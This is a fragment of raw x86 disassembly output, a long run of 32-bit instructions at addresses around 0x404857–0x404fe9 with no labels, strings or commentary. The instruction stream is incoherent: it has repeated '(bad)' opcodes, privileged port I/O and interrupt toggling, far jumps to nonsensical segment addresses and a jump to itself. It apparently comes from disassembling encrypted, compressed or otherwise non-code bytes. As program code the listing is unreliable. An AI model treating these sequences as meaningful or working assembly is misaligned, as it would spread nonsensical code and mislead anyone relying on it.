  404857:	cmp    cl,BYTE PTR [ebx+ebx*2-0x75]
  40485b:	(bad)  
  40485c:	leave  
  40485d:	stc    
  40485e:	inc    esp
  40485f:	mov    ecx,0x3bae5177
  404864:	push   esi
  404865:	loop   0x4048e3
  404867:	cmp    al,0xe1
  404869:	loope  0x404843
  40486b:	in     eax,0xe1
  40486d:	add    eax,0x87e939
  404872:	stc    
  404873:	pop    eax
  404874:	adc    eax,0xec004335
  404879:	or     cl,cl
  40487b:	mov    edx,0x383c9158
  404880:	in     eax,dx
  404881:	xchg   ebp,eax
  404882:	inc    ebx
  404883:	jne    0x404829
  404885:	dec    edx
  404886:	sti    
  404887:	mov    ah,0xb
  404889:	cmp    al,0x3a
  40488b:	mov    dh,0xb7
  40488d:	cmp    eax,edi
  40488f:	mov    dl,0x29
  404891:	shl    edx,0xf3
  404894:	inc    esp
  404895:	je     0x404895
  404897:	jle    0x404915
  404899:	mov    al,0x6d
  40489b:	sub    ebx,0xdc33f777
  4048a1:	ja     0x404879
  4048a3:	scas   al,BYTE PTR es:[edi]
  4048a4:	jns    0x404885
  4048a6:	mov    dh,0xac
  4048a8:	inc    ebp
  4048a9:	push   ds
  4048aa:	mov    cl,0x39
  4048ac:	add    al,ch
  4048ae:	sub    al,0xb0
  4048b0:	(bad)  
  4048b2:	dec    ebx
  4048b3:	jl     0x40491b
  4048b5:	sbb    eax,0xfbb70a9d
  4048ba:	stc    
  4048bb:	(bad)  
  4048bc:	sbb    esp,DWORD PTR fs:[ebp-0x644b05e8]
  4048c3:	or     cl,ch
  4048c5:	loope  0x404917
  4048c7:	sub    DWORD PTR cs:[esi],edx
  4048ca:	jb     0x40494a
  4048cc:	cdq    
  4048cd:	jl     0x404888
  4048cf:	jo     0x404908
  4048d1:	ins    DWORD PTR es:[edi],dx
  4048d2:	int    0x11
  4048d4:	sbb    eax,0x30e7d201
  4048d9:	in     al,0x53
  4048db:	loop   0x404938
  4048dd:	sbb    esp,edx
  4048df:	add    dh,dl
  4048e1:	call   0x8513518f
  4048e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048e7:	sahf   
  4048e8:	sub    eax,0xbbd8e1e4
  4048ed:	jno    0x4048bd
  4048ef:	sub    eax,0x68713c27
  4048f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048f5:	mov    al,0x74
  4048f7:	pop    es
  4048f8:	pop    esi
  4048f9:	mov    al,ds:0x816397c
  4048fe:	in     eax,0x26
  404900:	cmc    
  404901:	jbe    0x4048f9
  404903:	dec    ecx
  404904:	and    al,0xe
  404906:	jl     0x40489a
  404908:	fnstcw WORD PTR [eax]
  40490a:	or     eax,ecx
  40490c:	and    DWORD PTR ss:[edx],esi
  40490f:	xchg   DWORD PTR [ebx-0xe55813a],eax
  404915:	out    0xd,eax
  404917:	(bad)  [edi+0x1c0d7ac0]
  40491d:	push   eax
  40491e:	push   edi
  40491f:	jb     0x404998
  404921:	push   ds
  404922:	xor    BYTE PTR [ecx+ecx*1+0x6dcbc1fc],0x68
  40492a:	and    bh,bh
  40492c:	not    esp
  40492e:	dec    ebp
  40492f:	mov    esi,0xc5ca83a2
  404934:	cmp    ah,BYTE PTR [edi+0x40]
  404937:	int3   
  404938:	setle  BYTE PTR cs:[ebx-0x1b]
  40493d:	cld    
  40493e:	stc    
  40493f:	adc    DWORD PTR [ebp+0x2b],esi
  404942:	push   ss
  404943:	push   ecx
  404944:	mov    edx,0xc3363792
  404949:	mov    esp,0xd42d3c3
  40494e:	xchg   dx,ax
  404950:	sub    BYTE PTR ds:0x93a6aec4,bl
  404956:	aam    0x90
  404958:	test   DWORD PTR [edi],ecx
  40495a:	or     al,BYTE PTR [edx]
  40495c:	inc    eax
  40495d:	cld    
  40495e:	jne    0x404968
  404960:	mov    ds:0xf9b3fae,eax
  404965:	repnz fldenv [ebp+0x64be98b6]
  40496c:	imul   ebp,edx,0x2
  40496f:	in     eax,dx
  404970:	test   DWORD PTR [ecx-0x20],esi
  404973:	pop    esp
  404974:	fild   WORD PTR [edi]
  404976:	sbb    al,0x96
  404978:	pop    ecx
  404979:	fidiv  DWORD PTR [ebx+0x6a]
  40497c:	xchg   edi,eax
  40497d:	or     dl,bh
  40497f:	bound  ecx,QWORD PTR [edi+0x70ed6ebe]
  404985:	cli    
  404986:	mov    eax,ds:0xe8fb1948
  40498b:	cmp    edi,DWORD PTR [eax]
  40498d:	sbb    BYTE PTR [edx],bh
  40498f:	xor    al,0xf1
  404991:	cwde   
  404992:	mov    BYTE PTR [eax],dh
  404994:	sub    eax,0x722639e4
  404999:	adc    DWORD PTR [edx],eax
  40499b:	js     0x404a00
  40499d:	fimul  DWORD PTR [ebx-0x3d1360c7]
  4049a3:	(bad)  
  4049a4:	jp     0x404980
  4049a6:	(bad)  
  4049a8:	xchg   BYTE PTR [esi+ebx*4],cl
  4049ab:	xchg   ebp,eax
  4049ac:	out    0x42,eax
  4049ae:	cs mov ch,0xb2
  4049b1:	imul   esp,edi,0x5d5385ce
  4049b7:	mov    bl,0xa
  4049b9:	inc    ebx
  4049ba:	jo     0x404a19
  4049bc:	in     al,dx
  4049bd:	mov    ch,0x4d
  4049bf:	cli    
  4049c0:	test   DWORD PTR [ebx],0xeb700799
  4049c6:	loope  0x40494b
  4049c8:	outs   dx,BYTE PTR ds:[esi]
  4049c9:	out    dx,al
  4049ca:	rcr    al,cl
  4049cc:	push   edx
  4049cd:	add    dh,BYTE PTR [edi]
  4049cf:	dec    edi
  4049d0:	les    esp,FWORD PTR [ebx+0x14081a02]
  4049d6:	fild   QWORD PTR es:[esi]
  4049d9:	loopne 0x4049b8
  4049db:	xchg   eax,esp
  4049dd:	mov    bl,0x37
  4049df:	adc    ecx,ebp
  4049e1:	mov    ah,0x23
  4049e3:	pusha  
  4049e4:	dec    esi
  4049e5:	(bad)  
  4049e6:	xchg   ecx,eax
  4049e7:	pop    esp
  4049e8:	loope  0x4049fa
  4049ea:	cld    
  4049eb:	rol    edi,0xca
  4049ee:	add    al,0xe2
  4049f0:	and    ch,BYTE PTR [bp+di]
  4049f3:	std    
  4049f4:	imul   edx,DWORD PTR [ebp-0x6a],0xf532c955
  4049fb:	les    ebp,FWORD PTR [ecx+0x1b]
  4049fe:	or     edx,edx
  404a00:	dec    ebx
  404a01:	ficom  DWORD PTR [ecx]
  404a03:	aaa    
  404a04:	mov    cs,WORD PTR [esi]
  404a06:	or     eax,0x29150cab
  404a0b:	aas    
  404a0c:	jne    0x404999
  404a0e:	and    BYTE PTR [ecx-0x3a],ah
  404a11:	mov    ah,0xe
  404a13:	rol    BYTE PTR [eax-0x3fda0fb9],1
  404a19:	mov    al,ds:0xca8ebe07
  404a1e:	loope  0x4049da
  404a20:	f2xm1  
  404a22:	out    dx,eax
  404a23:	cmc    
  404a24:	xchg   esi,eax
  404a25:	push   esi
  404a26:	jge    0x404a62
  404a28:	push   eax
  404a29:	pusha  
  404a2a:	cmp    esi,edi
  404a2c:	push   edi
  404a2d:	jae    0x404aa4
  404a2f:	or     DWORD PTR [edx],ebx
  404a31:	sub    eax,0x5a655b56
  404a36:	or     al,0x7
  404a38:	dec    esi
  404a39:	mov    al,ds:0x6dbcf564
  404a3e:	adc    ah,BYTE PTR [esi]
  404a40:	cmp    eax,DWORD PTR [edx-0x20192327]
  404a46:	mov    ebx,0x20473257
  404a4b:	stos   BYTE PTR es:[edi],al
  404a4c:	(bad)  
  404a4d:	jecxz  0x4049da
  404a4f:	dec    ecx
  404a50:	lods   eax,DWORD PTR ds:[esi]
  404a51:	pop    ebx
  404a52:	lds    ebx,FWORD PTR [edi-0x5c]
  404a55:	adc    bh,BYTE PTR [ebp-0x1acae6d]
  404a5b:	mov    al,ds:0x600f2b4b
  404a60:	fstp   TBYTE PTR [esi+0x4e]
  404a63:	shl    esi,cl
  404a65:	ret    
  404a66:	bnd jb 0x4049fd
  404a69:	or     BYTE PTR [edi+0xcaafcf4],ah
  404a6f:	js     0x404ae8
  404a71:	scas   al,BYTE PTR es:[edi]
  404a72:	sub    BYTE PTR [eax],dl
  404a74:	(bad)  
  404a76:	out    dx,eax
  404a77:	ror    edi,cl
  404a79:	jmp    0x90ae:0xb5d28949
  404a80:	adc    al,BYTE PTR [edi]
  404a82:	jmp    0x404aa8
  404a84:	stc    
  404a85:	shl    DWORD PTR [ecx],cl
  404a87:	pop    ds
  404a88:	shl    DWORD PTR [esp+edi*1+0x2137be81],0x43
  404a90:	inc    eax
  404a91:	lods   eax,DWORD PTR ds:[esi]
  404a92:	push   ebx
  404a93:	inc    ebp
  404a94:	fwait
  404a95:	sub    cl,BYTE PTR [esi]
  404a97:	push   0x77d31f3c
  404a9c:	push   0x87dc3d7b
  404aa1:	pop    esp
  404aa2:	imul   esp,DWORD PTR [ebp+0x7a],0x5a
  404aa6:	ret    0x4628
  404aa9:	sbb    BYTE PTR [eax],ah
  404aab:	inc    eax
  404aac:	cdq    
  404aad:	sbb    al,0x24
  404aaf:	iret   
  404ab0:	mov    bl,0x32
  404ab2:	xchg   DWORD PTR ds:0xacd089a3,edx
  404ab8:	aas    
  404ab9:	(bad)  
  404abb:	jb     0x404afe
  404abd:	add    dl,BYTE PTR [esi+0x3e08153e]
  404ac3:	stos   DWORD PTR es:[edi],eax
  404ac4:	xor    bh,al
  404ac6:	(bad)  
  404ac7:	sub    al,0xb3
  404ac9:	sub    eax,0x92a81b7f
  404ace:	les    ebx,FWORD PTR [esi]
  404ad0:	and    edx,DWORD PTR [edi+esi*8+0x338771f2]
  404ad7:	jecxz  0x404b48
  404ad9:	pusha  
  404ada:	mov    eax,fs
  404adc:	(bad)  
  404add:	xor    BYTE PTR [eax-0x21dfcb85],bh
  404ae3:	dec    edx
  404ae4:	inc    esi
  404ae5:	mov    dh,0x17
  404ae7:	test   DWORD PTR [esi-0x1ac4c3a7],eax
  404aed:	imul   esp,DWORD PTR [ecx+0x14],0xffffffdc
  404af1:	popf   
  404af2:	iret   
  404af3:	and    edx,0x2d7769e9
  404af9:	fimul  DWORD PTR [ecx-0xe]
  404afc:	ret    0x5644
  404aff:	xor    DWORD PTR [eax-0x55],ecx
  404b02:	mov    al,BYTE PTR [ebx+0x807c57c]
  404b08:	push   edi
  404b09:	and    al,0xd6
  404b0b:	mov    esp,0x3e08a687
  404b10:	xor    DWORD PTR [eax-0x54f45ebf],esi
  404b16:	jbe    0x404b22
  404b18:	mov    dh,bh
  404b1a:	rol    DWORD PTR [edx],0x66
  404b1d:	fild   WORD PTR [ecx-0x39f01a01]
  404b23:	outs   dx,BYTE PTR ds:[esi]
  404b24:	pop    edx
  404b25:	sub    DWORD PTR [esi+0x75],esi
  404b28:	test   al,0xae
  404b2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b2b:	or     al,0xb4
  404b2e:	hlt    
  404b2f:	pop    ebp
  404b30:	aam    0xf4
  404b32:	jge    0x404b67
  404b34:	(bad)  
  404b35:	jl     0x404abe
  404b37:	jne    0x404bb0
  404b39:	popf   
  404b3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b3b:	mov    ds:0x3918fb52,al
  404b40:	push   ebx
  404b41:	dec    ebp
  404b42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b43:	outs   dx,BYTE PTR ds:[esi]
  404b44:	mov    edi,ecx
  404b46:	repnz dec edx
  404b48:	inc    esi
  404b49:	shl    ebp,cl
  404b4b:	cmp    ah,BYTE PTR [ebx+0x4116ae17]
  404b51:	inc    edi
  404b52:	cmc    
  404b53:	dec    edi
  404b54:	outs   dx,BYTE PTR ds:[esi]
  404b55:	adc    eax,0x9e1a954d
  404b5a:	inc    ecx
  404b5b:	push   0x57
  404b5d:	js     0x404bc2
  404b5f:	ret    0x2f3d
  404b62:	mov    ah,0x65
  404b64:	daa    
  404b65:	fdiv   QWORD PTR [edx]
  404b67:	add    edx,esp
  404b69:	inc    ebx
  404b6a:	enter  0x6774,0xed
  404b6e:	mov    ds:0x9ccd5610,al
  404b73:	arpl   di,sp
  404b75:	mov    esp,0xacf448db
  404b7a:	imul   ebx,DWORD PTR [eax-0xf],0xffffffbc
  404b7e:	dec    ebx
  404b7f:	(bad)  
  404b80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b81:	mov    ah,0x2
  404b83:	jbe    0x404bfb
  404b85:	xor    al,0x28
  404b87:	dec    ebp
  404b88:	xor    al,0x19
  404b8a:	fcomp  st(5)
  404b8c:	mov    dh,0xcc
  404b8e:	add    eax,0x48925c7b
  404b93:	adc    eax,0xf94139d8
  404b98:	(bad)  
  404b9a:	dec    edx
  404b9b:	in     al,0xa8
  404b9d:	ds ins DWORD PTR es:[edi],dx
  404b9f:	ins    BYTE PTR es:[edi],dx
  404ba0:	ds jne 0x404b9f
  404ba3:	pop    esi
  404ba4:	imul   esi,DWORD PTR [edx+0x5b],0x44
  404ba8:	fcom   st(3)
  404baa:	push   ecx
  404bab:	cmc    
  404bac:	push   eax
  404bad:	add    BYTE PTR [eax-0x2c9a279a],ah
  404bb3:	or     DWORD PTR [ebp+0x1d4d9d7d],edx
  404bb9:	aad    0xc5
  404bbb:	clc    
  404bbc:	icebp  
  404bbd:	pop    ebp
  404bbe:	cmp    dh,BYTE PTR [edx-0x55]
  404bc1:	sub    eax,0x808ea0d3
  404bc6:	(bad)  
  404bc7:	hlt    
  404bc8:	push   0x13
  404bca:	lods   al,BYTE PTR ds:[esi]
  404bcb:	mov    ebp,0x52cc21c7
  404bd0:	and    eax,0x20c1b46f
  404bd5:	pop    eax
  404bd6:	lds    esp,FWORD PTR [edi+0x37cc7269]
  404bdc:	repz sbb al,0xdd
  404bdf:	pop    ebx
  404be0:	mov    esp,edi
  404be2:	mov    ch,0x8d
  404be4:	pop    esp
  404be5:	out    0xe8,al
  404be7:	sbb    eax,0xb231ba9c
  404bec:	fsubr  st,st(2)
  404bee:	mov    esp,0x6b901043
  404bf3:	add    BYTE PTR [edi],bh
  404bf5:	jae    0x404b82
  404bf7:	mov    ch,0x52
  404bf9:	int    0x9b
  404bfb:	loopne 0x404bc6
  404bfd:	fdivr  QWORD PTR [edi-0x5f]
  404c00:	or     dh,BYTE PTR [ebp-0x6acd19f8]
  404c06:	scas   eax,DWORD PTR es:[edi]
  404c07:	imul   edx,DWORD PTR [esi+eiz*4],0xd6c65d28
  404c0e:	int3   
  404c0f:	in     eax,0x3f
  404c11:	fsubr  st(2),st
  404c13:	fptan  
  404c15:	or     eax,0xa76d3917
  404c1a:	xchg   ebp,eax
  404c1b:	aaa    
  404c1c:	mov    ds:0x88abda39,al
  404c21:	push   0x8487ecc5
  404c26:	lods   al,BYTE PTR ds:[esi]
  404c27:	shl    DWORD PTR ds:0x7d23955f,0xe
  404c2e:	outs   dx,BYTE PTR ds:[esi]
  404c2f:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  404c31:	or     al,0xa2
  404c33:	jo     0x404bcc
  404c35:	shr    DWORD PTR [ebx+edi*8-0x14],1
  404c39:	leave  
  404c3a:	add    ebx,esi
  404c3c:	loop   0x404c5b
  404c3e:	fisttp WORD PTR [ebx]
  404c40:	rcr    DWORD PTR [eax+eiz*8+0x49],1
  404c44:	imul   eax,DWORD PTR [edx+0x7e],0x1a
  404c48:	arpl   WORD PTR [ebx+0x1e3273aa],di
  404c4e:	ins    DWORD PTR es:[edi],dx
  404c4f:	ret    
  404c50:	pop    edi
  404c51:	stos   BYTE PTR es:[edi],al
  404c52:	xor    BYTE PTR [esi+0x785a336b],bl
  404c58:	xchg   ch,ch
  404c5a:	scas   eax,DWORD PTR es:[edi]
  404c5b:	pop    ds
  404c5c:	xor    al,0x46
  404c5e:	retf   0x1e32
  404c61:	jmp    0xbe60:0x8535768b
  404c68:	sub    DWORD PTR [ebp+edx*4+0x60],0x4
  404c6d:	push   ecx
  404c6e:	push   eax
  404c6f:	les    ecx,FWORD PTR [edi-0x29]
  404c72:	sar    esp,cl
  404c74:	in     eax,dx
  404c75:	mov    ecx,0x7a915250
  404c7a:	fsubr  QWORD PTR [esi-0x73]
  404c7d:	pusha  
  404c7e:	xchg   ebp,eax
  404c7f:	lods   al,BYTE PTR ds:[esi]
  404c80:	ins    BYTE PTR es:[edi],dx
  404c81:	jmp    DWORD PTR [ecx-0x57]
  404c84:	out    0x37,al
  404c86:	(bad)  
  404c87:	lock mov ebx,0x490087b9
  404c8d:	xchg   ecx,eax
  404c8e:	xlat   BYTE PTR ds:[ebx]
  404c8f:	push   cs
  404c90:	clc    
  404c91:	xchg   BYTE PTR [eax],dh
  404c93:	(bad)  
  404c94:	jne    0x404cdd
  404c96:	xchg   edi,eax
  404c97:	fisub  DWORD PTR [ebx]
  404c99:	xor    eax,0x9d35cc7f
  404c9e:	inc    ebx
  404c9f:	pop    edx
  404ca0:	pop    DWORD PTR [ecx-0x2277a533]
  404ca6:	iret   
  404ca7:	shl    DWORD PTR [edx],1
  404ca9:	mov    ah,0x8b
  404cab:	out    dx,eax
  404cac:	adc    al,0x82
  404cae:	mov    ah,0x6
  404cb0:	inc    edx
  404cb1:	pop    esi
  404cb2:	out    dx,eax
  404cb3:	add    DWORD PTR [esi+0x29],edx
  404cb6:	or     dl,BYTE PTR [esi-0x765b22f5]
  404cbc:	xchg   esp,eax
  404cbd:	loop   0x404cb6
  404cbf:	or     eax,0x66e5b46f
  404cc4:	lods   eax,DWORD PTR ds:[esi]
  404cc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cc6:	jmp    0xe286:0x69311ca5
  404ccd:	fucomi st,st(6)
  404ccf:	and    BYTE PTR [edi+0x62],ch
  404cd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cd3:	cld    
  404cd4:	pop    esp
  404cd5:	gs push ecx
  404cd7:	scas   eax,DWORD PTR es:[edi]
  404cd8:	div    DWORD PTR [esi-0x7d6598c6]
  404cde:	xor    ah,BYTE PTR [ebp+0x798fd5a6]
  404ce4:	out    0xb2,eax
  404ce6:	xchg   BYTE PTR ds:0x854265c9,dl
  404cec:	popa   
  404ced:	loopne 0x404cb0
  404cef:	shl    WORD PTR [edx+0x49b55e88],0xcb
  404cf7:	push   ecx
  404cf8:	jecxz  0x404cbc
  404cfa:	sbb    eax,0x79cbb5e8
  404cff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d00:	push   ebp
  404d01:	inc    esp
  404d02:	dec    ebp
  404d03:	jno    0x404cf6
  404d05:	sbb    al,BYTE PTR [ecx+ebx*1]
  404d08:	data16 (bad) 
  404d0a:	loopne 0x404ca5
  404d0c:	jbe    0x404cfa
  404d0e:	xchg   esp,eax
  404d0f:	pop    edi
  404d10:	call   0xb9fa22a6
  404d15:	pop    esi
  404d16:	mov    eax,0x78df08ce
  404d1b:	xchg   edx,eax
  404d1c:	xchg   ebx,eax
  404d1d:	fisttp QWORD PTR [ebp-0x25]
  404d20:	(bad)  
  404d22:	rcr    BYTE PTR [ecx+0x1683965],1
  404d28:	adc    DWORD PTR [ebx],esi
  404d2a:	cmp    eax,DWORD PTR [esi+0x5313e9cd]
  404d30:	mov    bh,0xb2
  404d32:	cmp    ax,0x716a
  404d36:	push   eax
  404d37:	xchg   ebp,eax
  404d38:	and    DWORD PTR [edx+esi*4],esp
  404d3b:	sahf   
  404d3c:	retf   
  404d3d:	adc    edx,DWORD PTR [ebx-0x57]
  404d40:	add    cl,al
  404d42:	popa   
  404d43:	push   ecx
  404d44:	mov    bl,0x58
  404d46:	cld    
  404d47:	jge    0x404d2e
  404d49:	int3   
  404d4a:	mov    WORD PTR [edi],gs
  404d4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d4d:	stos   BYTE PTR es:[edi],al
  404d4e:	push   ebx
  404d4f:	inc    ebp
  404d50:	adc    al,0xa
  404d52:	std    
  404d53:	pushf  
  404d54:	rcl    DWORD PTR [esi-0x39bce47f],1
  404d5a:	dec    esi
  404d5b:	jnp    0x404d63
  404d5d:	inc    esi
  404d5e:	push   ecx
  404d5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d60:	aam    0xfd
  404d62:	mov    ch,0xbb
  404d64:	mov    edi,0xe6721233
  404d69:	fwait
  404d6a:	mov    al,ds:0xd4536f6b
  404d6f:	lock xchg edi,eax
  404d71:	pop    ebx
  404d72:	adc    eax,0x97775bed
  404d77:	fdivp  st(4),st
  404d79:	adc    esp,DWORD PTR [edi+0x4c]
  404d7c:	mov    al,ds:0x4620284d
  404d81:	xor    al,0x8d
  404d83:	out    dx,al
  404d84:	neg    bh
  404d86:	je     0x404db5
  404d88:	mov    BYTE PTR [edi+esi*2],cl
  404d8b:	cmp    BYTE PTR [ebp+eax*8-0x1619ed8d],ah
  404d92:	mov    edx,0x40316e28
  404d97:	(bad)  
  404d98:	cmp    ch,BYTE PTR [ebp-0x261e29bf]
  404d9e:	xor    BYTE PTR [ebp+0x6fbdd4c9],cl
  404da4:	sub    ah,dl
  404da6:	push   es
  404da7:	sar    DWORD PTR ss:[edi+0x3ff2746],1
  404dae:	xchg   BYTE PTR [ecx],dh
  404db0:	call   0x50ec:0x53ec8753
  404db7:	mov    al,ds:0x2ff87d68
  404dbc:	or     al,0x7f
  404dbe:	mov    al,0x56
  404dc0:	mov    dl,0x45
  404dc2:	cmc    
  404dc3:	inc    esp
  404dc4:	adc    eax,0x267b1ffd
  404dc9:	add    al,0x36
  404dcb:	pop    edx
  404dcc:	inc    ebp
  404dcd:	inc    ecx
  404dce:	xchg   edx,eax
  404dcf:	push   ebp
  404dd0:	jecxz  0x404d77
  404dd2:	push   ecx
  404dd3:	ret    
  404dd4:	push   es
  404dd5:	std    
  404dd6:	fild   DWORD PTR [esi+eiz*4-0x36]
  404dda:	shl    DWORD PTR [edx],0x84
  404ddd:	mov    ah,0x48
  404ddf:	adc    BYTE PTR [edi-0x3e],al
  404de2:	dec    edi
  404de3:	or     al,0xd7
  404de5:	sub    al,0x8f
  404de7:	mov    dh,0xe
  404de9:	sbb    DWORD PTR [edi+0xd3a2ca3],ecx
  404def:	fldenv [esi+edi*8+0x7d970cad]
  404df6:	inc    eax
  404df7:	xchg   esp,eax
  404df8:	rol    al,0x8c
  404dfb:	call   0x6175abd1
  404e00:	dec    esi
  404e01:	lock enter 0xad31,0xdf
  404e06:	aam    0x71
  404e08:	mov    ds:0xb1d8aa15,al
  404e0d:	ja     0x404ddf
  404e0f:	inc    edx
  404e10:	aas    
  404e11:	xchg   ebx,eax
  404e12:	push   cs
  404e13:	dec    ecx
  404e14:	xlat   BYTE PTR ds:[ebx]
  404e15:	mov    DWORD PTR [eax],ecx
  404e17:	ins    BYTE PTR es:[edi],dx
  404e18:	gs sti 
  404e1a:	in     al,dx
  404e1b:	cmp    al,0x4a
  404e1d:	lods   al,BYTE PTR ds:[esi]
  404e1e:	or     eax,0x60d63ffb
  404e23:	stos   BYTE PTR es:[edi],al
  404e24:	aam    0xba
  404e26:	jae    0x404e9c
  404e28:	and    DWORD PTR [ecx-0x357fa347],eax
  404e2e:	mov    ebp,0xc407d5a2
  404e33:	xchg   ebp,eax
  404e34:	cdq    
  404e35:	jns    0x404eab
  404e37:	jne    0x404e5d
  404e39:	idiv   DWORD PTR [edx+edi*8+0xc]
  404e3d:	aaa    
  404e3e:	data16 xchg BYTE PTR [esi+0x3c16142f],dh
  404e45:	mov    ds:0x298ea4bd,al
  404e4a:	jge    0x404de6
  404e4c:	stos   BYTE PTR es:[edi],al
  404e4d:	jecxz  0x404e04
  404e4f:	add    BYTE PTR [ebx*4-0x39e87d53],ah
  404e56:	sti    
  404e57:	in     al,0xbf
  404e59:	sbb    bl,bh
  404e5b:	push   cs
  404e5c:	and    BYTE PTR [eax-0x2d31c614],dl
  404e62:	inc    esi
  404e63:	mov    WORD PTR [ecx],cs
  404e65:	aaa    
  404e66:	enter  0x7481,0x2e
  404e6a:	test   DWORD PTR [eax+edx*2],esi
  404e6d:	push   edx
  404e6e:	pop    ds
  404e6f:	lods   eax,DWORD PTR ds:[esi]
  404e70:	mov    cl,0x4a
  404e72:	les    esp,FWORD PTR [ebx]
  404e74:	loope  0x404ed1
  404e76:	aaa    
  404e77:	inc    eax
  404e78:	mov    BYTE PTR [edx],cl
  404e7a:	aad    0x5f
  404e7c:	and    DWORD PTR [eax],ebp
  404e7e:	loop   0x404eac
  404e80:	inc    edi
  404e81:	icebp  
  404e82:	out    0x9c,eax
  404e84:	test   DWORD PTR [ebx],0x38258f76
  404e8a:	mulps  xmm6,XMMWORD PTR [esi]
  404e8d:	jl     0x404ec9
  404e8f:	lahf   
  404e90:	jbe    0x404eb1
  404e92:	dec    eax
  404e93:	and    al,0x6b
  404e95:	lods   al,BYTE PTR ds:[esi]
  404e96:	mov    edx,0x2b556818
  404e9b:	mov    ebp,0xbc13be1
  404ea0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ea1:	outs   dx,BYTE PTR ds:[esi]
  404ea2:	adc    al,0x91
  404ea4:	dec    edx
  404ea5:	icebp  
  404ea6:	dec    eax
  404ea7:	shld   DWORD PTR [ebx-0x13],edi,0xdd
  404eac:	fcmovne st,st(1)
  404eae:	mov    ecx,0x463c0347
  404eb3:	fild   WORD PTR [eax+0x7d5d4c79]
  404eb9:	mov    dh,0x7c
  404ebb:	adc    ebx,eax
  404ebd:	push   edx
  404ebe:	mov    ds:0xd41e285d,al
  404ec3:	ins    BYTE PTR es:[edi],dx
  404ec4:	clc    
  404ec5:	xchg   esp,eax
  404ec6:	dec    eax
  404ec7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ec8:	jno    0x404f41
  404eca:	test   al,0x3d
  404ecc:	sbb    dh,BYTE PTR [eax+0x5]
  404ecf:	icebp  
  404ed0:	aad    0x27
  404ed2:	jne    0x404ea0
  404ed4:	cmc    
  404ed5:	mov    ds:0xb9f92a4e,eax
  404eda:	ds and eax,0x3ba93b21
  404ee0:	jmp    DWORD PTR [edx]
  404ee2:	or     esp,edi
  404ee4:	sub    eax,0x734ccdb0
  404ee9:	cdq    
  404eea:	mov    ds:0xfbca244d,eax
  404eef:	test   BYTE PTR [eax+edx*8+0x45],dh
  404ef3:	ds add al,0xd
  404ef6:	dec    esi
  404ef7:	jno    0x404ec9
  404ef9:	inc    esi
  404efa:	out    0x1f,eax
  404efc:	clc    
  404efd:	mov    ah,0x57
  404eff:	mov    ecx,0xe38ba2ab
  404f04:	cmp    esi,eax
  404f06:	or     bl,BYTE PTR [ecx+0xd]
  404f09:	call   0xf954:0x6bbd8ce6
  404f10:	mov    BYTE PTR [eax+0x71],cl
  404f13:	into   
  404f14:	mov    ah,0x4
  404f16:	mov    ecx,0xf37e2f5
  404f1b:	stos   DWORD PTR es:[edi],eax
  404f1c:	into   
  404f1d:	aaa    
  404f1e:	adc    al,0xad
  404f20:	call   0xd610:0x2a1b247f
  404f27:	xor    edi,edi
  404f29:	addr16 hlt 
  404f2b:	(bad)  
  404f2c:	xchg   edx,eax
  404f2d:	leave  
  404f2e:	pop    eax
  404f2f:	push   ss
  404f30:	mov    bh,0x86
  404f32:	xchg   ecx,eax
  404f33:	ja     0x404f62
  404f35:	(bad)  
  404f36:	mov    edx,0x470f310e
  404f3b:	and    ch,0xce
  404f3e:	cdq    
  404f3f:	mov    ah,0x9f
  404f42:	inc    eax
  404f43:	sar    BYTE PTR [ebx-0x261d6732],cl
  404f49:	or     al,0x1
  404f4b:	rcl    DWORD PTR [ebx+0x3c],0x16
  404f4f:	stc    
  404f50:	hlt    
  404f51:	vmulsd xmm4,xmm1,QWORD PTR [ebp-0x559cfb88]
  404f59:	dec    edx
  404f5a:	cs mov dh,0x86
  404f5d:	pushf  
  404f5e:	mov    DWORD PTR [eax-0x37ca3bb7],ebp
  404f64:	push   0x68dc33ae
  404f69:	xchg   esp,eax
  404f6a:	(bad)  
  404f6b:	xchg   ebx,eax
  404f6c:	and    BYTE PTR ds:0xa64ec1e7,0xc2
  404f73:	int3   
  404f74:	int    0x44
  404f76:	sub    BYTE PTR [edx+0x23ff805],dl
  404f7c:	push   ss
  404f7d:	jne    0x404f48
  404f7f:	pop    ecx
  404f80:	sbb    al,0x86
  404f82:	addr16 retf 0xe58a
  404f86:	gs push ss
  404f88:	stc    
  404f89:	push   0xac948ef5
  404f8e:	add    eax,0xce799f81
  404f93:	nop
  404f94:	jne    0x404f5d
  404f96:	sbb    eax,edx
  404f98:	cmp    BYTE PTR [eax+0x8],cl
  404f9b:	jg     0x404f5a
  404f9d:	test   esi,0xa3a8872a
  404fa3:	gs push 0x4cedcbd1
  404fa9:	jl     0x404fba
  404fab:	ins    DWORD PTR es:[edi],dx
  404fac:	push   ecx
  404fad:	les    ebx,FWORD PTR [ebp+0x2419ade5]
  404fb3:	sbb    dh,bh
  404fb5:	xchg   ebx,eax
  404fb6:	out    dx,eax
  404fb7:	loop   0x40502c
  404fb9:	test   ebp,esi
  404fbb:	test   al,0x17
  404fbd:	dec    edi
  404fbe:	adc    ebp,edi
  404fc0:	lods   eax,DWORD PTR ds:[esi]
  404fc1:	sub    eax,0x65435ee8
  404fc6:	addr16 adc eax,0x4fdbc6d5
  404fcc:	addr16 ja 0x404fb8
  404fcf:	dec    esi
  404fd0:	mov    al,0xc4
  404fd2:	cmp    al,0xbf
  404fd4:	dec    ecx
  404fd5:	aas    
  404fd6:	mov    ch,0x7f
  404fd8:	push   ebp
  404fd9:	push   esp
  404fda:	(bad)  [eax+0x45f8a15d]
  404fe0:	cmp    DWORD PTR [edx+0x172d110e],0xffffffbd
  404fe7:	jle    0x40505e
  404fe9:	repnz inc DWORD PTR [ecx*1-0x1a3767d9]
